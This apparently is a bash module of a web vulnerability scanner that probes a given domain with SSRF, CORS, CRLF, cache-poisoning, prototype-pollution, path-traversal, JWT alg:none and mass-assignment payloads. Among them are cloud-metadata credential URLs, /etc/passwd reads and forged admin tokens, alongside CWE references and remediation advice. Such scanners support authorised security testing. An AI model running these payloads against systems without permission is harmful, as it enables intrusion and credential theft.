#!/usr/bin/env bash

source "$(dirname "${BASH_SOURCE[0]}")/../lib/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../lib/utils.sh"

ADVANCED_VULN_COUNT=0

# --- Advanced Vulnerabilities Main Entry ---

scan_advanced_vulns() {
    local domain=$1
    echo "=== ADVANCED VULNERABILITY DETECTION ==="
    log_info "Starting advanced vulnerability scanning on $domain"

    adv_ssrf "$domain"
    adv_cors "$domain"
    adv_rate_limiting "$domain"
    adv_http_response_splitting "$domain"
    adv_cache_poisoning "$domain"
    adv_prototype_pollution "$domain"
    adv_jwt "$domain"
    adv_path_traversal "$domain"
    adv_business_logic "$domain"

    echo "Advanced vulnerability checks completed. Potential findings: $ADVANCED_VULN_COUNT"
    echo ""
}

# --- SSRF Detection ---

adv_ssrf() {
    local domain=$1
    echo "--- SSRF (Server-Side Request Forgery) Detection ---"

    local ssrf_payloads=(
        "http://169.254.169.254/latest/meta-data/"
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://100.100.100.200/latest/meta-data/"
        "http://127.0.0.1/"
        "http://localhost/"
        "http://0.0.0.0/"
        "http://[::1]/"
        "http://2130706433/"
        "http://0x7f000001/"
        "file:///etc/passwd"
    )

    local ssrf_params=(
        "url"
        "redirect"
        "next"
        "dest"
        "target"
        "proxy"
        "fetch"
        "load"
        "uri"
        "link"
        "src"
        "callback"
        "webhook"
    )

    local test_endpoints=(
        "https://$domain/api/fetch"
        "https://$domain/api/proxy"
        "https://$domain/api/webhook"
        "https://$domain/api/redirect"
    )

    for endpoint in "${test_endpoints[@]}"; do
        for param in "${ssrf_params[@]}"; do
            for payload in "${ssrf_payloads[@]}"; do
                local response
                response=$(curl -s -m 10 \
                    -H "User-Agent: AWJUNAID/2.0" \
                    "${endpoint}?${param}=$(url_encode "$payload")" 2>/dev/null || true)

                if echo "$response" | grep -qiE "ami-id|instance-id|computeMetadata|root:x:|iam/security"; then
                    echo "⚠️  [CRITICAL] SSRF confirmed: $endpoint?$param=<payload>"
                    echo "    Payload: $payload"
                    echo "    CWE-918 | CVSS: 9.8 (Critical)"
                    echo "    Remediation: Validate/whitelist URLs; block private IP ranges"
                    ((ADVANCED_VULN_COUNT++))
                fi
            done
        done
    done
    echo ""
}

# --- CORS Misconfiguration Detection ---

adv_cors() {
    local domain=$1
    echo "--- CORS Misconfiguration Detection ---"

    local evil_origins=(
        "https://evil.com"
        "https://attacker.com"
        "null"
        "https://${domain}.evil.com"
        "https://evil${domain}"
    )

    local api_endpoints=(
        "https://$domain/api"
        "https://$domain/api/v1"
        "https://$domain/api/user"
        "https://$domain/graphql"
    )

    for endpoint in "${api_endpoints[@]}"; do
        for origin in "${evil_origins[@]}"; do
            local response_headers
            response_headers=$(curl -s -I -m 10 \
                -H "Origin: $origin" \
                -H "User-Agent: AWJUNAID/2.0" \
                "$endpoint" 2>/dev/null || true)

            local acao
            acao=$(echo "$response_headers" | grep -i "Access-Control-Allow-Origin:" | cut -d':' -f2- | xargs 2>/dev/null || true)
            local acac
            acac=$(echo "$response_headers" | grep -i "Access-Control-Allow-Credentials:" | cut -d':' -f2- | xargs 2>/dev/null || true)

            if [[ "$acao" == "$origin" || "$acao" == "*" ]]; then
                if [[ "$acac" =~ true ]]; then
                    echo "⚠️  [CRITICAL] CORS misconfiguration with credentials: $endpoint"
                    echo "    ACAO: $acao | ACAC: $acac | Origin tested: $origin"
                    echo "    CWE-942 | CVSS: 8.8 (High)"
                    echo "    Remediation: Whitelist specific trusted origins; never reflect arbitrary origins"
                    ((ADVANCED_VULN_COUNT++))
                elif [[ "$acao" == "*" ]]; then
                    echo "⚠️  [MEDIUM] CORS wildcard origin allowed: $endpoint"
                    echo "    CWE-942 | CVSS: 5.3 (Medium)"
                    ((ADVANCED_VULN_COUNT++))
                else
                    echo "⚠️  [HIGH] CORS reflects arbitrary origin: $endpoint (Origin: $origin)"
                    echo "    CWE-942 | CVSS: 7.5 (High)"
                    ((ADVANCED_VULN_COUNT++))
                fi
            fi
        done
    done
    echo ""
}

# --- Rate Limiting Bypass Testing ---

adv_rate_limiting() {
    local domain=$1
    echo "--- Rate Limiting Bypass Testing ---"

    local login_endpoint="https://$domain/api/auth/login"
    local status_200_count=0
    local total_requests=10

    # NOTE: This test sends multiple login requests with dummy credentials.
    # This may trigger security alerts or temporary account lockouts on the target.
    # Use only on systems you are authorized to test.
    echo "Sending $total_requests rapid login requests to check rate limiting..."
    for i in $(seq 1 $total_requests); do
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" -m 5 \
            -X POST "$login_endpoint" \
            -H "Content-Type: application/json" \
            -H "User-Agent: AWJUNAID/2.0" \
            -d '{"username":"testuser","password":"testpass"}' 2>/dev/null || echo "000")

        if [[ "$status" == "200" || "$status" == "401" ]]; then
            ((status_200_count++))
        fi
    done

    if [[ $status_200_count -ge $total_requests ]]; then
        echo "⚠️  [HIGH] No rate limiting detected on login endpoint: $login_endpoint"
        echo "    All $total_requests requests succeeded without throttling"
        echo "    CWE-307 | CVSS: 7.5 (High)"
        echo "    Remediation: Implement rate limiting and account lockout policies"
        ((ADVANCED_VULN_COUNT++))
    else
        echo "✓  Rate limiting appears active (got blocked/throttled)"
    fi

    # Test for bypass via headers
    echo "Testing rate limit bypass via forwarded IP headers..."
    local bypass_headers=(
        "X-Forwarded-For: 127.0.0.1"
        "X-Real-IP: 192.168.1.1"
        "X-Originating-IP: 10.0.0.1"
        "X-Remote-Addr: 1.2.3.4"
    )

    for header in "${bypass_headers[@]}"; do
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" -m 5 \
            -X POST "$login_endpoint" \
            -H "Content-Type: application/json" \
            -H "User-Agent: AWJUNAID/2.0" \
            -H "$header" \
            -d '{"username":"testuser","password":"testpass"}' 2>/dev/null || echo "000")

        if [[ "$status" != "429" && "$status" != "000" ]]; then
            echo "⚠️  [MEDIUM] Possible rate limit bypass via header: $header (HTTP $status)"
            echo "    CWE-307 | CVSS: 6.5 (Medium)"
        fi
    done
    echo ""
}

# --- HTTP Response Splitting Detection ---

adv_http_response_splitting() {
    local domain=$1
    echo "--- HTTP Response Splitting Detection ---"

    local splitting_payloads=(
        $'test\r\nSet-Cookie: injected=value'
        $'test\r\nX-Injected: header'
        $'test%0d%0aSet-Cookie:%20injected%3dvalue'
        $'test%0aX-Injected:%20header'
    )

    local test_params=(
        "redirect"
        "next"
        "url"
        "lang"
        "location"
    )

    for param in "${test_params[@]}"; do
        for payload in "${splitting_payloads[@]}"; do
            local response
            response=$(curl -s -I -m 10 \
                -H "User-Agent: AWJUNAID/2.0" \
                "https://$domain/?${param}=${payload}" 2>/dev/null || true)

            if echo "$response" | grep -qi "^injected:\|^Set-Cookie:.*injected"; then
                echo "⚠️  [HIGH] HTTP Response Splitting: $domain?${param}=<payload>"
                echo "    CWE-113 | CVSS: 6.1 (Medium)"
                echo "    Remediation: Strip CR/LF from user-controlled redirect values"
                ((ADVANCED_VULN_COUNT++))
            fi
        done
    done
    echo ""
}

# --- Cache Poisoning via Headers ---

adv_cache_poisoning() {
    local domain=$1
    echo "--- Cache Poisoning via Headers ---"

    local cache_headers=(
        "X-Forwarded-Host: evil.com"
        "X-Host: evil.com"
        "X-Forwarded-Server: evil.com"
        "X-HTTP-Host-Override: evil.com"
        "Forwarded: host=evil.com"
    )

    for header in "${cache_headers[@]}"; do
        local response
        response=$(curl -s -m 10 \
            -H "User-Agent: AWJUNAID/2.0" \
            -H "$header" \
            "https://$domain" 2>/dev/null || true)

        if echo "$response" | grep -qi "evil\.com"; then
            echo "⚠️  [HIGH] Cache poisoning via '$header' — evil.com reflected in response"
            echo "    CWE-601 | CVSS: 8.1 (High)"
            echo "    Remediation: Validate Host header; do not trust X-Forwarded-Host"
            ((ADVANCED_VULN_COUNT++))
        fi
    done
    echo ""
}

# --- Prototype Pollution in JavaScript Frameworks ---

adv_prototype_pollution() {
    local domain=$1
    echo "--- Prototype Pollution Detection ---"

    local proto_payloads=(
        '{"__proto__":{"polluted":true}}'
        '{"constructor":{"prototype":{"polluted":true}}}'
        '[{"__proto__":{"polluted":true}}]'
    )

    local json_endpoints=(
        "https://$domain/api/v1/user"
        "https://$domain/api/v1/settings"
        "https://$domain/api/merge"
        "https://$domain/api/config"
        "https://$domain/api/update"
    )

    for payload in "${proto_payloads[@]}"; do
        for endpoint in "${json_endpoints[@]}"; do
            local response
            response=$(curl -s -m 10 -X POST "$endpoint" \
                -H "Content-Type: application/json" \
                -H "User-Agent: AWJUNAID/2.0" \
                -d "$payload" 2>/dev/null || true)

            if echo "$response" | grep -qiE '"polluted"\s*:\s*true|__proto__|prototype chain'; then
                echo "⚠️  [HIGH] Prototype pollution detected: $endpoint"
                echo "    Payload: $payload"
                echo "    CWE-1321 | CVSS: 8.1 (High)"
                echo "    Remediation: Sanitize object merges; use Object.create(null)"
                ((ADVANCED_VULN_COUNT++))
            fi
        done
    done
    echo ""
}

# --- JWT Algorithm Confusion and Expiration Flaws ---

adv_jwt() {
    local domain=$1
    echo "--- JWT Algorithm Confusion and Expiration Flaws ---"

    # Create a JWT with alg:none
    local header_b64
    header_b64=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
    local payload_b64
    payload_b64=$(echo -n '{"sub":"admin","role":"admin","iat":1000000000,"exp":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')
    local none_jwt="${header_b64}.${payload_b64}."

    # Create a JWT with alg:HS256 signed with empty secret
    local hs256_header_b64
    hs256_header_b64=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
    local hs256_jwt_unsigned="${hs256_header_b64}.${payload_b64}"

    local auth_endpoints=(
        "https://$domain/api/v1/user"
        "https://$domain/api/v1/profile"
        "https://$domain/api/admin"
        "https://$domain/api/v1/admin"
    )

    for endpoint in "${auth_endpoints[@]}"; do
        # Test alg:none attack
        local response
        response=$(curl -s -m 10 "$endpoint" \
            -H "Authorization: Bearer $none_jwt" \
            -H "User-Agent: AWJUNAID/2.0" 2>/dev/null || true)

        if echo "$response" | grep -qiE '"sub"\s*:\s*"admin|"role"\s*:\s*"admin|"email"\s*:|"id"\s*:'; then
            echo "⚠️  [CRITICAL] JWT 'alg:none' attack succeeded: $endpoint"
            echo "    CWE-347 | CVSS: 9.8 (Critical)"
            echo "    Remediation: Explicitly validate JWT algorithm; reject alg:none"
            ((ADVANCED_VULN_COUNT++))
        fi

        # Test expired token acceptance
        local expired_payload_b64
        expired_payload_b64=$(echo -n '{"sub":"test","exp":1}' | base64 | tr -d '=' | tr '+/' '-_')
        local expired_jwt="${hs256_header_b64}.${expired_payload_b64}.invalidsig"

        local expired_response
        expired_response=$(curl -s -m 10 "$endpoint" \
            -H "Authorization: Bearer $expired_jwt" \
            -H "User-Agent: AWJUNAID/2.0" 2>/dev/null || true)

        if echo "$expired_response" | grep -qiE '"id"\s*:|"email"\s*:|"sub"\s*:'; then
            echo "⚠️  [HIGH] Expired JWT accepted: $endpoint"
            echo "    CWE-613 | CVSS: 8.8 (High)"
            echo "    Remediation: Validate JWT expiry (exp claim) on every request"
            ((ADVANCED_VULN_COUNT++))
        fi
    done
    echo ""
}

# --- Path Traversal (LFI/RFI) with Encoding Variations ---

adv_path_traversal() {
    local domain=$1
    echo "--- Path Traversal (LFI/RFI) Detection ---"

    local traversal_payloads=(
        "../../../etc/passwd"
        "..%2F..%2F..%2Fetc%2Fpasswd"
        "..%252F..%252F..%252Fetc%252Fpasswd"
        "....//....//....//etc/passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"
        "..\\..\\..\\etc\\passwd"
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd"
    )

    local traversal_params=(
        "file"
        "path"
        "page"
        "include"
        "template"
        "view"
        "doc"
        "filename"
        "load"
        "read"
    )

    for param in "${traversal_params[@]}"; do
        for payload in "${traversal_payloads[@]}"; do
            local response
            response=$(curl -s -m 10 \
                -H "User-Agent: AWJUNAID/2.0" \
                "https://$domain/?${param}=${payload}" 2>/dev/null || true)

            if echo "$response" | grep -qE "root:x:[0-9]+:[0-9]+:|nobody:x:|daemon:x:"; then
                echo "⚠️  [CRITICAL] Path traversal (LFI) confirmed: ?${param}=${payload}"
                echo "    CWE-22 | CVSS: 9.1 (Critical)"
                echo "    Remediation: Validate and canonicalize file paths; use allowlists"
                ((ADVANCED_VULN_COUNT++))
            fi
        done
    done
    echo ""
}

# --- Business Logic Flaw Detection ---

adv_business_logic() {
    local domain=$1
    echo "--- Business Logic Flaw Detection ---"

    # Negative price / quantity
    local cart_endpoint="https://$domain/api/cart"
    local order_endpoint="https://$domain/api/order"

    local negative_qty_response
    negative_qty_response=$(curl -s -m 10 -X POST "$cart_endpoint" \
        -H "Content-Type: application/json" \
        -H "User-Agent: AWJUNAID/2.0" \
        -d '{"product_id":1,"quantity":-1,"price":9.99}' 2>/dev/null || true)

    if echo "$negative_qty_response" | grep -qiE '"total"\s*:\s*-|"price"\s*:\s*-|"amount"\s*:\s*-'; then
        echo "⚠️  [HIGH] Negative quantity/price accepted (possible free/credit exploit)"
        echo "    CWE-840 | CVSS: 7.5 (High)"
        echo "    Remediation: Validate quantity/price server-side; reject non-positive values"
        ((ADVANCED_VULN_COUNT++))
    fi

    # Mass assignment / over-posting
    local mass_assign_endpoints=(
        "https://$domain/api/v1/user"
        "https://$domain/api/v1/profile"
    )

    for endpoint in "${mass_assign_endpoints[@]}"; do
        local response
        response=$(curl -s -m 10 -X PUT "$endpoint" \
            -H "Content-Type: application/json" \
            -H "User-Agent: AWJUNAID/2.0" \
            -d '{"username":"test","role":"admin","isAdmin":true,"verified":true}' 2>/dev/null || true)

        if echo "$response" | grep -qiE '"role"\s*:\s*"admin|"isAdmin"\s*:\s*true|"verified"\s*:\s*true'; then
            echo "⚠️  [HIGH] Mass assignment vulnerability: $endpoint"
            echo "    Privileged fields accepted in user update payload"
            echo "    CWE-915 | CVSS: 8.8 (High)"
            echo "    Remediation: Use allowlist for accepted fields; separate admin operations"
            ((ADVANCED_VULN_COUNT++))
        fi
    done
    echo ""
}
